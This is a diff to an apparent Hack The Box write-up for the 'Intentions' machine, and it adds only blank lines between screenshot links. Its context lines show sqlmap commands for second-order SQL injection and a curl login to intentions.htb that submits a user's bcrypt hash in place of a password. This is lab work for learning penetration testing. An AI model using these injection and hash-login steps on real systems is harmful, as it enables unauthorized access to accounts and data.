@@ -20,7 +20,9 @@ sqlmap -r req2b.txt --batch
 ```
 ![image](https://github.com/regarmulia/HTB/assets/33616880/a41968e9-a125-4022-9554-7a2015c569a3)
 
+
 ![image](https://github.com/regarmulia/HTB/assets/33616880/a8183c38-7b4f-423c-8661-ca351f473565)
+
 
 ![image](https://github.com/regarmulia/HTB/assets/33616880/318256aa-4f54-4605-b7d5-2b4add64a990)
 
@@ -30,6 +32,7 @@ sqlmap -r req2b.txt --batch
 sqlmap -r req1.txt --second-req=req2.txt --batch --tamper=space2comment
 ```
 ![image](https://github.com/regarmulia/HTB/assets/33616880/1a7c8a8c-c45e-4474-86ac-090c34b7db0e)
+
 
 ![image](https://github.com/regarmulia/HTB/assets/33616880/806ea88f-c009-46ad-95b3-92d8e9cd2c79)
 
@@ -59,6 +62,7 @@ curl -X POST http://intentions.htb/api/v1/auth/login
 ```
 ![image](https://github.com/regarmulia/HTB/assets/33616880/94443e9d-fda1-424e-aa75-2bc33dbccf6e)
 
+
 ![image](https://github.com/regarmulia/HTB/assets/33616880/91adcde2-ab47-4d10-8890-016e7d0e6534)
 
 
@@ -66,6 +70,7 @@ curl -X POST http://intentions.htb/api/v1/auth/login
 curl -d 'email=steve@intentions.htb&hash=$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa' -X POST http://intentions.htb/api/v2/auth/login
 ```
 ![image](https://github.com/regarmulia/HTB/assets/33616880/a740f795-07cd-49c5-b0fa-4cba7ec0a070)
+
 
 ![image](https://github.com/regarmulia/HTB/assets/33616880/50514396-8dea-43e8-8654-ee351d81958b)
 
@@ -77,7 +82,9 @@ Edited: v2, hash
 ```
 ![image](https://github.com/regarmulia/HTB/assets/33616880/20c9ec85-1a6a-4f92-b883-011609a50140)
 
+
 ![image](https://github.com/regarmulia/HTB/assets/33616880/9bde9358-3c79-4186-9cbc-63ebb13ec344)
+
 
 ![image](https://github.com/regarmulia/HTB/assets/33616880/ce76950b-7767-47dd-a328-7d7953ee15f9)
 
@@ -87,6 +94,7 @@ http://intentions.htb/admin#/
 http://intentions.htb/api/v2/admin/image/modify
 ```
 ![image](https://github.com/regarmulia/HTB/assets/33616880/0b6871de-0e54-44c1-9d14-27943f81f53b)
+
 
 ![image](https://github.com/regarmulia/HTB/assets/33616880/788c8136-6a8f-4715-95b9-e558c5b1a819)
 
